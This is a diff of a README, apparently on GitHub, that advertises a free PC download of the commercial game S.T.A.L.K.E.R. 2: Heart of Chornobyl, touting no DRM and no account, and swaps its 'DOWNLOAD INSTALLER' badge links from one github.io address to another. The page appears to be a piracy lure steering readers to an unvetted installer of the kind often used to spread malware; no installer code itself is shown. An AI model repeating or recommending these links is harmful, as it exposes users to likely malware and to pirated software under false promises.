@@ -1,6 +1,6 @@
 # S.T.A.L.K.E.R. 2: Heart of Chornobyl — Free PC Download
 
-[![☢️ DOWNLOAD INSTALLER: S.T.A.L.K.E.R. 2: Heart of Chornobyl](https://img.shields.io/badge/☢️%20DOWNLOAD%20INSTALLER:%20S.T.A.L.K.E.R.%202-yellow?style=for-the-badge&logo=nuclear&logoColor=black)](https://ryadikmntiiks.github.io/.github/ST2HOC)
+[![☢️ DOWNLOAD INSTALLER: S.T.A.L.K.E.R. 2: Heart of Chornobyl](https://img.shields.io/badge/☢️%20DOWNLOAD%20INSTALLER:%20S.T.A.L.K.E.R.%202-yellow?style=for-the-badge&logo=nuclear&logoColor=black)](https://stalker-2-heart-of-chernobyl-download.github.io/.github)
 
 ## ☢️ About the Game
 
@@ -40,7 +40,7 @@ Whether you are facing mutated beasts, navigating anomalies, or negotiating with
 - 🚫 No launcher, no DRM, no account required  
 - 🎮 PC-optimized performance with stunning next-gen visuals
 
-[![☢️ DOWNLOAD INSTALLER: S.T.A.L.K.E.R. 2: Heart of Chornobyl](https://img.shields.io/badge/☢️%20DOWNLOAD%20INSTALLER:%20S.T.A.L.K.E.R.%202-yellow?style=for-the-badge&logo=nuclear&logoColor=black)](https://ryadikmntiiks.github.io/.github/ST2HOC)
+[![☢️ DOWNLOAD INSTALLER: S.T.A.L.K.E.R. 2: Heart of Chornobyl](https://img.shields.io/badge/☢️%20DOWNLOAD%20INSTALLER:%20S.T.A.L.K.E.R.%202-yellow?style=for-the-badge&logo=nuclear&logoColor=black)](https://stalker-2-heart-of-chernobyl-download.github.io/.github)
 
 ---
 
